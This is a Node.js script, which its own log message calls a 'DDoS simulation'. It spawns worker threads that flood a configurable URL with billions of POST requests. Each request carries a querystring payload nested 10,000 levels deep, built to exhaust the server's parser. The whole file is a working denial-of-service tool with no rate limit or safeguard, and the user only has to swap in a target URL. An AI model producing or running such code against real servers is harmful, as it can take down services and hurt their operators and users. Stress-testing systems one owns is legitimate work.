/* eslint-disable prettier/prettier */
const {
  Worker,
  isMainThread,
  parentPort,
  workerData,
} = require("worker_threads");
const axios = require("axios"); // Axios for HTTP requests
const querystring = require("querystring");

// Target server URL
const TARGET_URL = 'https://example.com/submit'; // Change to your server's URL
const NUM_WORKERS = 4; // Number of worker threads to spawn
const REQUESTS_PER_WORKER = 10009990000; // Requests each worker sends
const MAX_DEPTH = 10000; // Maximum nesting depth for the payload
const BATCH_SIZE = 100; // Number of requests to send in each batch

// Function to generate a deeply nested payload
function generateDeeplyNestedPayload(depth) {
  let obj = {};
  let current = obj;
  for (let i = 0; i < depth; i++) {
    current["level" + i] = {};
    current = current["level" + i];
  }
  current["final"] = "payload";
  return querystring.stringify(obj);
}

// Function to send HTTP requests in batches
async function sendRequestsInBatch(payloads) {
  try {
    console.log(`Sending ${payloads.length} requests in batch...`);
    // Send all requests in parallel using Promise.all for efficiency
    const results = await Promise.allSettled(
      payloads.map((payload) =>
        axios.post(TARGET_URL, payload, {
          headers: {
            "Content-Type": "application/x-www-form-urlencoded",
          },
        })
      )
    );
    console.log(`Batch request completed`);
    // results.forEach((result) => {
    //   if (result.status === "rejected") {
    //     console.error(`Request failed: ${result.reason.message}`);
    //   }
    // });
  } catch (error) {
    // console.error(`Batch request failed: ${error.message}`);
    throw error;
  }
}

// Main thread logic
if (isMainThread) {
  console.log("Starting DDoS simulation using worker threads...");

  // Spawn worker threads
  for (let i = 0; i < NUM_WORKERS; i++) {
    new Worker(__filename, {
      workerData: {
        workerId: i,
        requestsPerWorker: REQUESTS_PER_WORKER,
        maxDepth: MAX_DEPTH,
        batchSize: BATCH_SIZE, // Add batch size to worker data
      },
    });
  }
} else {
  // Worker thread logic
  const { workerId, requestsPerWorker, maxDepth, batchSize } = workerData;

  console.log(
    `Worker ${workerId} started, sending ${requestsPerWorker} requests in batches of ${batchSize}`
  );

  // Generate the deeply nested payload once and reuse it in each batch
  const payload = generateDeeplyNestedPayload(maxDepth);

  (async () => {
    // Process requests in batches
    for (let i = 0; i < requestsPerWorker; i += batchSize) {
      const payloads = Array(batchSize).fill(payload);
      await sendRequestsInBatch(payloads);
    }
    console.log(`Worker ${workerId} finished sending requests.`);
    parentPort.postMessage(`Worker ${workerId} done`);
  })();
}
